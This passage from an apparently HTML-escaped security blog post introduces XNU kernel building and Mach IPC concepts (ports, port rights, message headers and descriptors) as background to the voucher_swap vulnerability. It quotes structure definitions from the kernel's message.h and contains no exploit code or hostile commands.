&lt;h2 id=&quot;building-the-kernel&quot;&gt;Building the Kernel&lt;/h2&gt;

&lt;p&gt;Building the kernel is quite important in finding vulnerabilities. In fact, the bug that we are discussing here (voucher_swap) wouldn’t have been identified with just a source code review of the xnu kernel. It’s a little complicated to build the kernel because of the dependencies and the reliance on the built version to be the same version of the host machine, but a quick google search will land you on many articles with step by step instruction to compile the kernel including &lt;a href=&quot;https://gist.github.com/bazad/654959120a423b226dc564073b435453&quot;&gt;this&lt;/a&gt; automation script written by @_bazad for XNU version 4570.1.46 (MacOS High Sierra 10.13). We will look into the actual vulnerability in Part 2 where we will look into the vulnerable source code present in one of the MIG generated files.&lt;/p&gt;

&lt;h2 id=&quot;mach-messaging&quot;&gt;Mach Messaging&lt;/h2&gt;

&lt;p&gt;One of the unique features of the XNU kernel is its extensive use of &lt;strong&gt;Mach IPC&lt;/strong&gt;, which is derived from the Mach microkernel, and is easily one of the fastest IPC mechanisms developed till date. A lot of the frequently used IPC mechanisms on iOS such as XPC still use Mach messaging under the hood. Here are some essential points about Mach messaging.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mach IPC is based on unidirectional communication&lt;/li&gt;
  &lt;li&gt;Communication in Mach IPC happens between Ports (endpoints) in the form of Mach messages. Mach messages can be simple or complex, depending on a certain bit set in the message header.&lt;/li&gt;
  &lt;li&gt;In order to send messages, you must have an associated port right to it. The same applies for receiving a message, in order to receive a message, you must have a receive right to the port. The different types of rights are
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;MACH_PORT_RIGHT_SEND&lt;/strong&gt; - Send right to a port allowing unlimited messages&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;MACH_PORT_RIGHT_RECEIVE&lt;/strong&gt; - Receive rights to a port&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;MACH_PORT_RIGHT_SEND_ONCE&lt;/strong&gt; - Send right allowing only one message to a port&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;MACH_PORT_RIGHT_PORT_SET&lt;/strong&gt; - A set of rights to a port&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;MACH_PORT_RIGHT_DEAD_NAME&lt;/strong&gt; - If the receiver dies, then the SEND right to it becomes MACH_PORT_RIGHT_DEAD_NAME. The same applies when the sender has SEND_ONCE to the port and one message gets sent.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Mach Port rights can be embedded and sent over Mach messages.&lt;/li&gt;
  &lt;li&gt;There can be multiple &lt;strong&gt;SEND&lt;/strong&gt; rights but only one &lt;strong&gt;RECEIVE&lt;/strong&gt; right for a PORT. SEND rights can also be cloned whereas RECEIVE rights cannot.&lt;/li&gt;
  &lt;li&gt;When Mach messages are sent, they are held in a queue in the kernel unless received by the receiver. This technique has been used in the past for &lt;strong&gt;Heap-feng-shui&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;One of the most important binaries in iOS is launchd, which acts as the bootstrap server and allows processes to communicate with each other. launchd can help one process look up another process since all the processes check in with launchd and register themselves once they boot up. Consequently, launchd can also implement throttling and allow or deny lookup in certain situations, thereby acting as a security control. The importance of launchd cannot be underestimated and hence it is the first daemon to be launched (PID 1) and any crash in launchd would immediately trigger a kernel panic.&lt;/li&gt;
  &lt;li&gt;Messages are sent and received by threads within a process, which acts as the execution unit within a process. However, the port right is held on a task level, and is mentioned in the task’s &lt;strong&gt;ipc_space&lt;/strong&gt; (discussed later)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s have a look at the kernel to find the Mach IPC related code. Navigate to &lt;strong&gt;xnu-4903.221.1/osfmk/mach/message.h&lt;/strong&gt;. As discussed before, messages can be simple or complex in nature. In the image below, you can see the structure of a simple mach message (&lt;strong&gt;mach_msg_base_t&lt;/strong&gt;), which includes a header(&lt;strong&gt;mach_msg_header_t&lt;/strong&gt;) and a body(&lt;strong&gt;mach_msg_body_t&lt;/strong&gt;). However, for a simple message, the body is ignored by the kernel.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;397&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;398&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;399&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msgh_descriptor_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_body_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;401&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;402&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_BODY_NULL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_body_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_DESCRIPTOR_NULL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;405&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;406&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;407&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_msg_bits_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;408&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;409&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;msgh_remote_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;410&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;msgh_local_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;411&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;msgh_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;412&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_msg_id_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;msgh_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;413&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;414&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;415&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;msgh_reserved&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;msgh_voucher_port&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;416&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_NULL&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;417&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;418&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;419&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;420&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;421&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;mach_msg_body_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;422&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_base_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The mach message header structure has the following attributes.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;msgh_bits&lt;/strong&gt;: It’s a bitmap containing various properties of the message, such as whether the message is simple or complex, the action to be performed (such as moving or copying port rights). The complete logic can be found in &lt;strong&gt;osfmk/mach/message.h&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;msgh_size&lt;/strong&gt;: Size of (header + body)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;msgh_remote_port&lt;/strong&gt;: Send right to the destination port&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;msgh_local_port&lt;/strong&gt;: Receive right to the port where message needs to be received&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;msgh_voucher_port&lt;/strong&gt;: Vouchers are used to pass arbitrary data in messages over key-value pairs&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;msgh_id&lt;/strong&gt;: An arbitrary 32-bit field&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Complex messages are specified with the complex bit set to 1 in the &lt;strong&gt;msgh_bits&lt;/strong&gt; as defined in message.h&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXPORT_HDRS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;132&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_ZERO&lt;/span&gt;		&lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;133&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;134&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_REMOTE_MASK&lt;/span&gt;	&lt;span class=&quot;mh&quot;&gt;0x0000001f&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;135&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_LOCAL_MASK&lt;/span&gt;	&lt;span class=&quot;mh&quot;&gt;0x00001f00&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;136&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_VOUCHER_MASK&lt;/span&gt;	&lt;span class=&quot;mh&quot;&gt;0x001f0000&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;137&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;138&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_PORTS_MASK&lt;/span&gt;		\
    &lt;span class=&quot;mi&quot;&gt;139&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_REMOTE_MASK&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;	\
    &lt;span class=&quot;mi&quot;&gt;140&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		 &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_LOCAL_MASK&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;	\
    &lt;span class=&quot;mi&quot;&gt;141&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		 &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_VOUCHER_MASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;142&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;143&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_COMPLEX&lt;/span&gt;		&lt;span class=&quot;mh&quot;&gt;0x80000000U&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* message is complex */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;144&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;145&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_USER&lt;/span&gt;             &lt;span class=&quot;mh&quot;&gt;0x801f1f1fU&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* allowed bits user-&amp;gt;kernel */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;146&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;147&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_RAISEIMP&lt;/span&gt;		&lt;span class=&quot;mh&quot;&gt;0x20000000U&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* importance raised due to msg */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;148&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_DENAP&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_RAISEIMP&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It also contains certain descriptors in addition to the header, and the number of descriptors is specified in the body (&lt;strong&gt;msgh_descriptor_count&lt;/strong&gt;).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXPORT_HDRS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;388&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;389&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;390&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_msg_port_descriptor_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;391&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_msg_ool_descriptor_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;out_of_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;392&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_msg_ool_ports_descriptor_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;393&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_msg_type_descriptor_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;394&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;395&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;396&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;397&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;398&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;399&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msgh_descriptor_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_body_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;401&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;402&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_BODY_NULL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_body_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_DESCRIPTOR_NULL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;405&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;406&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;407&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_msg_bits_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;408&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;409&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;msgh_remote_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;410&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;msgh_local_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
